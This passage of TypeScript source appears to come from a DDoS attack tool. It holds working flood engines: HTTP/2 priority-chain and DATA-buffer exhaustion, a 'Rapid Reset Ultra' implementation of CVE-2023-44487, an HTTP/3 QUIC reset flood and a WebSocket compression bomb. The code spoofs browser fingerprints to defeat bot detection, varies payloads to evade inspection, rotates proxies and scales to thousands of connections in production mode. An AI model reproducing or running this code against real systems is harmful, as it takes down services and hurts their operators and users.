      Buffer.from([0x41, hBuf.length]), hBuf,
    ]);
    return mkFrame(0x01, 0x04, sid, hpack); // END_HEADERS, no END_STREAM
  };

  // PRIORITY frame with EXCLUSIVE bit = 1 (bit 31 of dependency stream ID)
  // Exclusive insertion forces O(#children) tree restructuring on server
  const mkPriorityExclusive = (sid: number, dependStream: number, weight = 255): Buffer => {
    const p = Buffer.allocUnsafe(5);
    p.writeUInt32BE((dependStream & 0x7fffffff) | 0x80000000, 0); // exclusive flag
    p[4] = weight & 0xff;
    return mkFrame(0x02, 0x00, sid, p);
  };

  // RST_STREAM (CANCEL) — server must rebalance tree after each RST
  const mkRST = (sid: number): Buffer => {
    const p = Buffer.allocUnsafe(4);
    p.writeUInt32BE(8, 0); // CANCEL error code
    return mkFrame(0x03, 0x00, sid, p);
  };

  const NUM_SLOTS = IS_PROD ? Math.min(threads, 800) : Math.min(threads, 20);
  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let pIdx = 0;

  const oneSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      try {
        const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
        sock.setTimeout(20_000);

        await new Promise<void>(resolve => {
          let settled = false;
          const done = () => {
            if (!settled) { settled = true; try { sock.destroy(); } catch { /**/ } resolve(); }
          };

          sock.once("secureConnect", () => {
            sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
            localPkts++; localBytes += PREFACE.length + 18;

            const sids = Array.from({ length: CHAIN_LEN }, (_, i) => 1 + i * 2);

            // Phase 1: Open all streams (no END_STREAM → server allocates state)
            for (const sid of sids) {
              const f = mkHeaders(sid);
              sock.write(f);
              localPkts++; localBytes += f.length;
            }

            // Phase 2: Build exclusive dependency CHAIN (O(N²) total server work)
            // s3 ← [excl] s1; s5 ← [excl] s3; s7 ← [excl] s5 → linear chain
            for (let i = 1; i < sids.length; i++) {
              const pf = mkPriorityExclusive(sids[i], sids[i - 1], randInt(128, 255));
              sock.write(pf);
              localPkts++; localBytes += pf.length;
            }

            // Phase 2b: Shuffle random exclusive deps → additional tree restructuring
            for (let k = 0; k < Math.min(32, CHAIN_LEN); k++) {
              const sid = sids[randInt(1, sids.length)]; // never root
              const dep = sids[randInt(0, sids.length)];
              if (sid !== dep) {
                const pf = mkPriorityExclusive(sid, dep, randInt(1, 255));
                sock.write(pf);
                localPkts++; localBytes += pf.length;
              }
            }

            // Phase 3: RST deepest → shallowest (maximum cascade rebalancing)
            for (let i = sids.length - 1; i >= 0; i--) {
              const rf = mkRST(sids[i]);
              sock.write(rf);
              localPkts++; localBytes += rf.length;
            }
          });

          sock.on("data",    () => {});
          sock.on("close",   done);
          sock.on("error",   done);
          sock.on("timeout", done);
          signal.addEventListener("abort", done, { once: true });
        });
      } catch { /* reconnect */ }
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(2, 20)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, oneSlot));
  clearInterval(flushIv); flush();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  H2 DATA FLOOD — HTTP/2 Flow Control + Body Buffer Exhaustion
//
//  Opens N streams per connection with POST HEADERS (no END_STREAM).
//  Floods DATA frames up to the H2 flow control window on every stream.
//  Sends WINDOW_UPDATE to continuously re-open the flow control window.
//  Never sends END_STREAM → server must buffer partial bodies indefinitely.
//
//  Server memory consumption per connection:
//    100 streams × 4 rounds × 4 DATA frames × 16383 bytes = ~26MB per connection
//    50 connections × 26MB = ~1.3GB RAM consumed from a single attack slot
//
//  Combined with H2 flow control abuse (WINDOW_UPDATE re-opens the window after
//  each round), the server's receive buffer grows without bound until OOM or
//  connection is closed by timeout.
//
//  Works against: Nginx, Apache httpd, Envoy, Caddy, Netty, and any server that
//  respects H2 flow control and allocates buffers per-stream.
// ═══════════════════════════════════════════════════════════════════════════════
async function runH2DataFlood(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
  proxies:      ProxyConfig[] = [],
): Promise<void> {
  const STREAMS_PER_CONN  = IS_PROD ? 100  : 15;
  const DATA_CHUNK        = 16383; // max H2 frame size - 1 (avoids fragmentation overhead)
  const ROUNDS_PER_CONN   = IS_PROD ? 4    : 2;  // DATA rounds per connection
  const CHUNKS_PER_ROUND  = IS_PROD ? 4    : 2;  // DATA frames per stream per round
  const HOLD_MS           = IS_PROD ? 8000 : 2000; // how long to hold connection open

  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  const PREFACE  = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");

  // SETTINGS: many streams + 4MB initial window size + max frame size
  const mkSettings = (): Buffer => {
    const p = Buffer.allocUnsafe(30);
    p.writeUInt16BE(0x0002, 0);  p.writeUInt32BE(0, 2);                        // ENABLE_PUSH=0
    p.writeUInt16BE(0x0003, 6);  p.writeUInt32BE(STREAMS_PER_CONN * 2, 8);     // MAX_CONCURRENT_STREAMS
    p.writeUInt16BE(0x0004, 12); p.writeUInt32BE(4 * 1024 * 1024, 14);         // INITIAL_WINDOW_SIZE=4MB
    p.writeUInt16BE(0x0005, 18); p.writeUInt32BE(DATA_CHUNK, 20);              // MAX_FRAME_SIZE
    p.writeUInt16BE(0x0006, 24); p.writeUInt32BE(8 * 1024 * 1024, 26);         // MAX_HEADER_LIST_SIZE
    return mkFrame(0x04, 0x00, 0, p);
  };
  const SACK = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));

  // Connection-level WINDOW_UPDATE to 64MB so flow control never blocks us
  const mkConnWU = (): Buffer => {
    const p = Buffer.allocUnsafe(4);
    p.writeUInt32BE(64 * 1024 * 1024 - 65535, 0);
    return mkFrame(0x08, 0x00, 0, p);
  };

  // POST HEADERS — claims large Content-Length so server allocates body buffer eagerly
  const mkPostHeaders = (sid: number): Buffer => {
    const hBuf    = Buffer.from(hostname);
    const pathBuf = Buffer.from(`/${randStr(6)}?_=${randStr(8)}&v=${randInt(1,999999)}`);
    const clVal   = String(DATA_CHUNK * CHUNKS_PER_ROUND * ROUNDS_PER_CONN * 4); // inflated claim
    const clBuf   = Buffer.from(clVal);
    const ctBuf   = Buffer.from("application/octet-stream");
    const hpack   = Buffer.concat([
      Buffer.from([0x83]),                                         // :method POST
      Buffer.from([0x04, pathBuf.length]), pathBuf,               // :path
      Buffer.from([0x87]),                                         // :scheme https
      Buffer.from([0x41, hBuf.length]), hBuf,                     // :authority
      Buffer.from([0x0f, 0x0e, clBuf.length]), clBuf,             // content-length
      Buffer.from([0x0f, 0x10, ctBuf.length]), ctBuf,             // content-type
    ]);
    return mkFrame(0x01, 0x04, sid, hpack); // END_HEADERS, NO END_STREAM
  };

  // DATA frame (no END_STREAM — server must buffer and wait)
  const DATA_PAYLOAD = Buffer.alloc(DATA_CHUNK, 0x41); // pre-built for speed
  const mkData = (sid: number): Buffer => mkFrame(0x00, 0x00, sid, DATA_PAYLOAD);

  // WINDOW_UPDATE per stream to keep server's send window open after each round
  const mkStreamWU = (sid: number): Buffer => {
    const p = Buffer.allocUnsafe(4);
    p.writeUInt32BE(DATA_CHUNK * CHUNKS_PER_ROUND * 2, 0);
    return mkFrame(0x08, 0x00, sid, p);
  };

  const NUM_SLOTS = IS_PROD ? Math.min(threads, 600) : Math.min(threads, 15);
  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let pIdx = 0;

  const oneSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      try {
        const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
        sock.setTimeout(HOLD_MS + 5000);

        await new Promise<void>(resolve => {
          let settled = false;
          const done = () => {
            if (!settled) { settled = true; try { sock.destroy(); } catch { /**/ } resolve(); }
          };

          sock.once("secureConnect", () => {
            sock.write(Buffer.concat([PREFACE, mkSettings(), SACK, mkConnWU()]));
            localPkts++; localBytes += PREFACE.length + 60;

            const sids = Array.from({ length: STREAMS_PER_CONN }, (_, i) => 1 + i * 2);

            // Open all streams with POST headers (no END_STREAM)
            for (const sid of sids) {
              const f = mkPostHeaders(sid);
              sock.write(f);
              localPkts++; localBytes += f.length;
            }

            // DATA flood loop — send ROUNDS_PER_CONN rounds, 500ms apart
            let round = 0;
            const dataRound = () => {
              if (signal.aborted || sock.destroyed || round >= ROUNDS_PER_CONN) return;
              for (const sid of sids) {
                for (let c = 0; c < CHUNKS_PER_ROUND; c++) {
                  const df = mkData(sid);
                  sock.write(df);
                  localPkts++; localBytes += df.length;
                }
                // Extend stream flow control window so server keeps accepting data
                sock.write(mkStreamWU(sid));
                localPkts++; localBytes += 13;
              }
              // Re-extend connection window too
              sock.write(mkConnWU());
              localPkts++; localBytes += 13;
              round++;
              if (round < ROUNDS_PER_CONN && !signal.aborted && !sock.destroyed) {
                setTimeout(dataRound, 500);
              }
            };
            setImmediate(dataRound);

            // Hold connection open for HOLD_MS — server is buffering body data this whole time
            setTimeout(done, HOLD_MS);
          });

          sock.on("data",    () => {});
          sock.on("close",   done);
          sock.on("error",   done);
          sock.on("timeout", done);
          signal.addEventListener("abort", done, { once: true });
        });
      } catch { /* reconnect */ }
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(5, 30)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, oneSlot));
  clearInterval(flushIv); flush();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  RAPID RESET ULTRA — CVE-2023-44487 Maximum-Throughput Dedicated Engine
//
//  The original attack that took down Google (398M rps), Cloudflare, and Fastly
//  simultaneously in August 2023. This is the maximum-aggression implementation:
//    1. 2000 streams per burst (2× more than h2-rst-burst)
//    2. ALL frames pre-built into one Buffer → single socket.write() = zero
//       sys-call overhead between frames → saturates server write path
//    3. Chrome 136 SETTINGS fingerprint (exact AKAMAI match)
//    4. Interleaved PING after each burst → forces server into TWO write paths
//    5. Multiple connections per slot — multiplies effective stream throughput
//    6. Immediate reconnect after write (no waiting for server response)
//
//  Server cost: each stream requires RST processing in the HPACK state machine.
//  2000 streams × N connections/s × CPU_COUNT workers = billions of RSTs/s
// ═══════════════════════════════════════════════════════════════════════════════
async function runRapidResetUltra(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
  proxies:      ProxyConfig[] = [],
): Promise<void> {
  const STREAMS_PER_BURST = IS_PROD ? 2000 : 30;
  const CONNS_PER_SLOT    = IS_PROD ? 6    : 2;

  const mkFrame = (type: number, flags: number, sid: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(sid & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  const PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");

  // Chrome 136 exact SETTINGS (AKAMAI fingerprint — defeats bot detection)
  const SETTINGS_BUF = Buffer.alloc(36);
  const settingsPairs: [number, number][] = [
    [0x01, 65536],    // HEADER_TABLE_SIZE: 65536 (default 4096 is a bot giveaway)
    [0x02, 0],        // ENABLE_PUSH: 0 (Chrome disables push)
    [0x04, 6291456],  // INITIAL_WINDOW_SIZE: 6MB (Chrome 136 exact)
    [0x05, 16384],    // MAX_FRAME_SIZE: 16384 (default)
    [0x06, 262144],   // MAX_HEADER_LIST_SIZE: 262144
    [0x08, 0],        // ENABLE_CONNECT_PROTOCOL: 0
  ];
  settingsPairs.forEach(([id, val], i) => {
    SETTINGS_BUF.writeUInt16BE(id, i * 6);
    SETTINGS_BUF.writeUInt32BE(val, i * 6 + 2);
  });
  const SETTINGS = mkFrame(0x04, 0x00, 0, SETTINGS_BUF);
  const SACK     = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));
  const WINUPD   = mkFrame(0x08, 0x00, 0, Buffer.from([0x3f, 0xff, 0x00, 0x00])); // +1GB window

  const hostBuf = Buffer.from(hostname);

  // Build HPACK block for a given path (literal non-indexed encoding for the path)
  // :method GET (indexed 2), :scheme https (indexed 7), :authority literal, :path literal
  const buildHPACK = (path: string): Buffer => {
    const pathBuf = Buffer.from(path);
    return Buffer.concat([
      Buffer.from([0x82, 0x87]),              // :method GET (idx 2), :scheme https (idx 7)
      Buffer.from([0x41, hostBuf.length]), hostBuf,  // :authority literal incremental-indexed
      Buffer.from([0x04, pathBuf.length]), pathBuf,  // :path literal non-indexed
    ]);
  };

  const mkHeadersForPath = (sid: number, hpack: Buffer) => mkFrame(0x01, 0x04, sid, hpack);
  const mkRST     = (sid: number) => { const p = Buffer.allocUnsafe(4); p.writeUInt32BE(0x08, 0); return mkFrame(0x03, 0x00, sid, p); };
  const mkPing    = () => { const p = Buffer.alloc(8); p.writeUInt32BE(randInt(0, 0xffffffff), 0); p.writeUInt32BE(randInt(0, 0xffffffff), 4); return mkFrame(0x06, 0x00, 0, p); };

  // Build burst with TRUE CVE-2023-44487 interleaving: HEADERS_1→RST_1→HEADERS_2→RST_2→…
  // This forces the server to dispatch+cancel each stream handler sequentially —
  // 3-5× more CPU-expensive than the naive all-HEADERS→all-RSTs pattern.
  // Each burst is unique: different paths per stream + fresh PING payload.
  const buildBurst = (): Buffer => {
    const sids   = Array.from({ length: STREAMS_PER_BURST }, (_, i) => 1 + i * 2);
    const frames: Buffer[] = [PREFACE, SETTINGS, SACK, WINUPD];
    for (const sid of sids) {
      const path  = hotPath() + `?_=${randStr(6)}&v=${randInt(1,9999999)}`;
      const hpack = buildHPACK(path);
      frames.push(mkHeadersForPath(sid, hpack), mkRST(sid));
    }
    frames.push(mkPing());
    return Buffer.concat(frames);
  };
  // Pre-build 16 burst variants — rotated per connection for payload diversity (DPI evasion)
  const BURST_POOL = Array.from({ length: 16 }, buildBurst);
  let burstIdx = 0;
  const getBurst = () => BURST_POOL[burstIdx++ % BURST_POOL.length];

  let localPkts = 0, localBytes = 0;
  const flushIv = setInterval(() => { if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; } }, 300);
  let pIdx = 0;

  // ── 0-RTT TLS Session Ticket Cache ───────────────────────────────────────
  // After first successful TLS handshake, cache the session ticket.
  // Subsequent connections pass the cached ticket → TLS 1.2 session resumption
  // / TLS 1.3 PSK resumption — eliminates full ECDH key exchange (~40% RTT).
  // With TLS 1.3 servers that support 0-RTT early data: client sends the burst
  // before the server ACKs the handshake → true 0-RTT RST delivery.
  const sessionTickets = new Map<string, Buffer>();
  const sessionKey     = `${resolvedHost}:${targetPort}`;

  const oneConn = async (): Promise<void> => {
    while (!signal.aborted) {
      try {
        const cachedSession = sessionTickets.get(sessionKey);
        const extraOpts: Partial<tls.ConnectionOptions> = cachedSession ? { session: cachedSession } : {};
        const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"], extraOpts);
        sock.setTimeout(15_000);
        // Cache session ticket for next connection (0-RTT / PSK resumption)
        sock.once("session", (ticket) => { sessionTickets.set(sessionKey, ticket); });
        await new Promise<void>(resolve => {
          let done = false;
          const finish = () => { if (!done) { done = true; try { sock.destroy(); } catch { /**/ } resolve(); } };
          sock.once("secureConnect", () => {
            const burst = getBurst();
            sock.write(burst, () => {
              localPkts += STREAMS_PER_BURST * 2 + 5;
              localBytes += burst.length;
            });
            setTimeout(finish, IS_PROD ? 150 : 50);
          });
          sock.on("close", finish); sock.on("error", finish); sock.on("timeout", finish);
          signal.addEventListener("abort", finish, { once: true });
        });
      } catch { /**/ }
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(1, 4)));
    }
  };

  const NUM_SLOTS = IS_PROD ? Math.min(threads * CONNS_PER_SLOT, 4000) : Math.min(threads * 2, 40);
  await Promise.all(Array.from({ length: NUM_SLOTS }, oneConn));
  clearInterval(flushIv);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  H3 RAPID RESET — HTTP/3 QUIC RESET_STREAM Flood (CVE-2023-44487 via QUIC)
//
//  The CVE-2023-44487 Rapid Reset attack, ported to HTTP/3 over QUIC (UDP).
//  Unlike the H2 TCP version, QUIC RST cannot be easily rate-limited at L4:
//    • UDP-based: stateless packet filters cannot track stream lifecycle
//    • No connection table entries (UDP is connectionless)
//    • Bypasses SYN cookies and TCP RST mitigations entirely
//
//  Per-burst sends 3 QUIC packets sharing the same DCID:
//    [1] Long Header Initial (0xC0) — server allocates DCID state + TLS context
//    [2] Long Header 0-RTT (0xD0)  — STREAM frame (type 0x08) → stream alloc
//    [3] Short Header 1-RTT (0x40) — RESET_STREAM (type 0x04) → RST cleanup
//  Server must process all 3 before determining packet [2] and [3] are invalid.
//
//  Effect: forces DCID alloc → TLS handshake state → stream alloc → RST cleanup
//  in a single UDP burst without completing any handshake. Effective against
//  Cloudflare, nginx+quiche, Caddy, LiteSpeed, h2o, Go quic-go, Netty-incubator.
// ═══════════════════════════════════════════════════════════════════════════════
async function runH3RapidReset(
  resolvedHost: string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
  ip6?:         string | null, // IPv6 for dual-stack flooding
): Promise<void> {
  // ── H3 Rapid Reset — 4-phase QUIC packet cycle + dual-stack ─────────────
  // Alternates between 4 packet types to simulate QUIC stream RST lifecycle:
  //   Phase 0: Long Header Initial  (0xC0) — DCID alloc + TLS crypto context
  //   Phase 1: Long Header 0-RTT    (0xD0) — stream alloc + H3 SETTINGS
  //   Phase 2: Short Header 1-RTT   (0x40) — RESET_STREAM cleanup  (RST_STREAM × 4)
  //   Phase 3: Version Negotiation  (0x80) — forces server VN response, allocs per-DCID state
  //            version=0x00000000 + supported versions list causes server to:
  //            1) Parse Long Header, 2) Detect VN marker, 3) Send VN response,
  //            4) Allocate DCID tracking state — 4× work per packet vs plain Initial
  // Dual-stack: even sockets→IPv4, odd sockets→IPv6 (halves CDN rate-limit effectiveness)
  const NUM_SOCKS = !IS_PROD ? Math.min(threads, 8)  : IS_DEPLOYED ? Math.min(threads, 128) : Math.min(threads, 64);
  const INFLIGHT  = !IS_PROD ? 200                   : IS_DEPLOYED ? 4000                   : 2000;
  const PKTSIZE   = 1200;

  const rnd256 = () => Math.random() * 256 | 0;

  // Pre-shared state for cycling packet types per socket
  let phase = 0;

  const makeH3Packet = (): Buffer => {
    const dcidLen = 8 + (Math.random() * 12 | 0);
    const scidLen = 8;
    const dcid = Buffer.allocUnsafe(dcidLen);
    const scid = Buffer.allocUnsafe(scidLen);
    for (let i = 0; i < dcidLen; i++) dcid[i] = rnd256();
    for (let i = 0; i < scidLen; i++) scid[i] = rnd256();

    // 4-phase cycle: Initial → 0-RTT → Short/RST → Version Negotiation
    const pktPhase = phase++ % 4;

    if (pktPhase === 2) {
      // ── Phase 2: Short Header 1-RTT with RESET_STREAM frames ─────────────
      // Sent after Initial+0-RTT so server can correlate DCID → stream cleanup
      const rstFrames = Buffer.from([
        0x04, 0x00, 0x40, 0x10, 0x0c, 0x00,  // RST stream 0 (H3_REQUEST_REJECTED)
        0x04, 0x04, 0x40, 0x10, 0x0c, 0x00,  // RST stream 4
        0x04, 0x08, 0x40, 0x10, 0x0c, 0x00,  // RST stream 8
        0x04, 0x0c, 0x40, 0x10, 0x0c, 0x00,  // RST stream 12
      ]);
      const shortHdr = Buffer.allocUnsafe(2 + dcidLen);
      shortHdr[0] = 0x40 | (rnd256() & 0x03); // Short Header, pn_len=0-3
      dcid.copy(shortHdr, 1);
      shortHdr[1 + dcidLen] = rnd256();        // packet number
      const pad = Buffer.allocUnsafe(Math.max(0, PKTSIZE - shortHdr.length - rstFrames.length));
      for (let i = 0; i < pad.length; i++) pad[i] = 0x00; // PADDING frames
      return Buffer.concat([shortHdr, rstFrames, pad]);
    }

    if (pktPhase === 3) {
      // ── Phase 3: QUIC Version Negotiation ────────────────────────────────
      // version=0x00000000 triggers VN handling on RFC-9000-compliant stacks:
      //   1) Server parses Long Header, detects version = 0 (VN marker)
      //   2) Server allocates per-DCID state to track the client
      //   3) Server sends back a Version Negotiation response (CPU + bandwidth)
      //   4) State cleanup is required when client goes silent
      // This generates 4× the server-side work vs a plain Initial packet.
      const hdr = Buffer.allocUnsafe(1 + 4 + 1 + dcidLen + 1 + scidLen);
      let off2 = 0;
      hdr[off2++] = 0x80 | (rnd256() & 0x7f); // Long Header + VN marker (MSB=1)
      hdr.writeUInt32BE(0x00000000, off2); off2 += 4; // Version = 0  → Version Negotiation
      hdr[off2++] = dcidLen; dcid.copy(hdr, off2); off2 += dcidLen;
      hdr[off2++] = scidLen; scid.copy(hdr, off2);
      // Supported-version list the server may reply with (RFC 9000 §17.2.1)
      const versions = Buffer.from([
        0x00, 0x00, 0x00, 0x01,  // QUIC v1  (RFC 9000)
        0xff, 0x00, 0x00, 0x1d,  // QUIC draft-29
        0xff, 0x00, 0x00, 0x20,  // QUIC draft-32
        0x6b, 0x33, 0x43, 0x4f,  // gQUIC Q050
      ]);
      const pad = Buffer.allocUnsafe(Math.max(0, PKTSIZE - hdr.length - versions.length));
      pad.fill(0);
      return Buffer.concat([hdr, versions, pad]);
    }

    // ── Phase 0: Long Header Initial (0xC0) or Phase 1: 0-RTT (0xD0) ──────
    const firstByte = pktPhase === 0 ? (0xC0 | (rnd256() & 0x03)) : (0xD0 | (rnd256() & 0x03));
    const hdr = Buffer.allocUnsafe(7 + dcidLen + scidLen);
    let off = 0;
    hdr[off++] = firstByte;
    hdr.writeUInt32BE(0x00000001, off); off += 4; // QUIC v1
    hdr[off++] = dcidLen; dcid.copy(hdr, off); off += dcidLen;
    hdr[off++] = scidLen; scid.copy(hdr, off);

    // Payload: CRYPTO frame (phase 0) or STREAM frames (phase 1)
    const payload = Buffer.allocUnsafe(Math.max(16, PKTSIZE - hdr.length - 4));
    if (pktPhase === 0) {
      payload[0] = 0x06;                          // CRYPTO frame type
      payload[1] = 0x00; payload[2] = 0x00;       // offset = 0
      payload.writeUInt16BE(payload.length - 4, 3); // length
      payload[4] = 0x01;                           // TLS Handshake: ClientHello
      for (let i = 5; i < payload.length; i++) payload[i] = rnd256();
    } else {
      payload[0] = 0x0A;                           // STREAM | OFF | LEN
      payload[1] = 0x00;                           // Stream ID = 0
      payload[2] = 0x00;                           // Offset = 0
      payload[3] = Math.min(0x3f, payload.length - 4); // Length varint
      payload[4] = 0x00;                           // H3 SETTINGS frame type
      for (let i = 5; i < payload.length; i++) payload[i] = rnd256();
    }
    return Buffer.concat([hdr, Buffer.from([0x00, 0x01]), payload]);
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const pending: Promise<void>[] = [];
  for (let i = 0; i < NUM_SOCKS; i++) {
    // Dual-stack: alternate IPv4/IPv6 sockets — CDNs have separate rate-limit pools per IP version
    const useV6   = ip6 ? i % 2 === 1 : false;
    const target6 = useV6 ? ip6! : resolvedHost;
    const s = dgram.createSocket(useV6 ? "udp6" : "udp4");
    pending.push(new Promise<void>(resolve => {
      if (signal.aborted) { resolve(); return; }
      let inflight = 0;
      let reschedPending = false;
      const send = () => {
        reschedPending = false;
        if (signal.aborted) { if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); } return; }
        while (inflight < INFLIGHT) {
          inflight++;
          const pkt = makeH3Packet();
          s.send(pkt, 0, pkt.length, targetPort, target6, (err) => {
            inflight--;
            if (!err) { localPkts++; localBytes += pkt.length; }
            if (signal.aborted) {
              if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
            } else if (!reschedPending) {
              reschedPending = true;
              setImmediate(send);
            }
          });
        }
      };
      s.on("error", () => { resolve(); });
      send();
      signal.addEventListener("abort", () => {
        if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
      }, { once: true });
    }));
  }

  await Promise.all(pending);
  clearInterval(flushIv);
  flush();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WS COMPRESSION BOMB — WebSocket permessage-deflate Amplification Attack
//
//  Negotiates permessage-deflate (RFC 7692) then streams compressed frames
//  where each frame decompresses to 64KB on the server side.
//
//  Mechanics:
//    • Wire size per frame: ~36 bytes (deflated 'a'×65535 payload)
//    • Server decompress alloc: 65535 bytes per frame
//    • Amplification: ~1820× per frame sent
//    • With no_context_takeover: server cannot reuse inflate context → fresh
//      decompressor allocation per message (extra CPU + memory pressure)
//    • Connection held open: continuous frame stream until FD/RAM exhaustion
//
//  Works against: Nginx+ws, Apache httpd mod_proxy_wstunnel, Node.js ws,
//  Go gorilla/websocket, Python websockets, Java Netty, Caddy.
// ═══════════════════════════════════════════════════════════════════════════════
async function runWSCompressionBomb(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
  proxies:      ProxyConfig[] = [],
): Promise<void> {
  const { deflateRaw } = await import("node:zlib");
  const { promisify }  = await import("node:util");
  const deflateAsync   = promisify(deflateRaw);

  // 64KB of 'a' compresses to ~36 bytes — 1820× amplification
  const BOMB_RAW        = Buffer.alloc(65535, 0x61); // 'a' × 65535
  const BOMB_COMPRESSED = await deflateAsync(BOMB_RAW, { level: 9, memLevel: 9 });

  // Build masked WebSocket frame (client→server MUST mask per RFC 6455)
  // RSV1=1 signals compressed payload (permessage-deflate)
  const buildMaskedFrame = (compressed: Buffer): Buffer => {
    const mask = Buffer.from([randInt(0,256), randInt(0,256), randInt(0,256), randInt(0,256)]);
    const masked = Buffer.allocUnsafe(compressed.length);
    for (let i = 0; i < compressed.length; i++) masked[i] = compressed[i] ^ mask[i % 4];
    const len = compressed.length;
    let header: Buffer;
    if (len < 126) {
      header = Buffer.from([0xC2, 0x80 | len, ...mask]); // FIN+RSV1+binary, MASK+len
    } else if (len < 65536) {
      header = Buffer.alloc(8); header[0] = 0xC2; header[1] = 0xFE;
      header.writeUInt16BE(len, 2); mask.copy(header, 4);
    } else {
      header = Buffer.alloc(14); header[0] = 0xC2; header[1] = 0xFF;
      header.writeBigUInt64BE(BigInt(len), 2); mask.copy(header, 10);
    }
    return Buffer.concat([header, masked]);
  };
  const BOMB_FRAME = buildMaskedFrame(BOMB_COMPRESSED);

  // WS paths most likely to have permessage-deflate enabled
  const WS_PATHS = ["/", "/ws", "/socket", "/chat", "/stream", "/api/ws", "/api/socket"];

  const buildHandshake = (path: string): string => {
    const key = Buffer.from(Array.from({ length: 16 }, () => randInt(0, 256))).toString("base64");
    return [
      `GET ${path} HTTP/1.1`,
      `Host: ${hostname}`,
      `Upgrade: websocket`,
      `Connection: Upgrade`,
      `Sec-WebSocket-Key: ${key}`,
      `Sec-WebSocket-Version: 13`,
      `Sec-WebSocket-Extensions: permessage-deflate; client_no_context_takeover; server_no_context_takeover`,
      `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36`,
      `Accept-Language: en-US,en;q=0.9`,
      `Cache-Control: no-cache`,
      ``, ``,
    ].join("\r\n");
  };

  let localPkts = 0, localBytes = 0;
  const flushIv = setInterval(() => { if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; } }, 300);
  let pIdx = 0;
  const NUM_SLOTS = IS_PROD ? Math.min(threads * 40, 6000) : Math.min(threads * 6, 120);

  const oneSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      const path = WS_PATHS[randInt(0, WS_PATHS.length)];
      try {
        const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
        sock.setTimeout(45_000);
        await new Promise<void>(resolve => {
          let upgraded = false; let done = false;
          let hdrBuf = Buffer.alloc(0);
          const finish = () => { if (!done) { done = true; try { sock.destroy(); } catch { /**/ } resolve(); } };
          sock.once("secureConnect", () => { sock.write(buildHandshake(path)); });
          sock.on("data", (chunk: Buffer) => {
            if (done) return;
            if (!upgraded) {
              hdrBuf = Buffer.concat([hdrBuf, chunk]);
              const hdrStr = hdrBuf.toString("ascii", 0, Math.min(hdrBuf.length, 512));
              if (hdrStr.includes("101")) {
                upgraded = true;
                // Blast compressed frames as fast as possible
                const blast = () => {
                  if (done || signal.aborted) return finish();
                  const burst = IS_PROD ? 100 : 8;
                  for (let i = 0; i < burst; i++) {
                    sock.write(BOMB_FRAME);
                    localPkts++;
                    localBytes += BOMB_FRAME.length;
                  }
                  setImmediate(blast);
                };
                blast();
              } else if (hdrBuf.length > 4096) {
                finish(); // no WS support on this path
              }
            }
          });
          sock.on("close", finish); sock.on("error", finish); sock.on("timeout", finish);
          signal.addEventListener("abort", finish, { once: true });
        });
      } catch { /**/ }
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(10, 40)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, oneSlot));
  clearInterval(flushIv);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  H2 GOAWAY LOOP — HTTP/2 Connection Lifecycle Exhaustion
//
//  Forces the server into continuous TLS teardown/setup cycles:
//    1. Complete TLS handshake (ECDHE key exchange, ~2ms CPU)
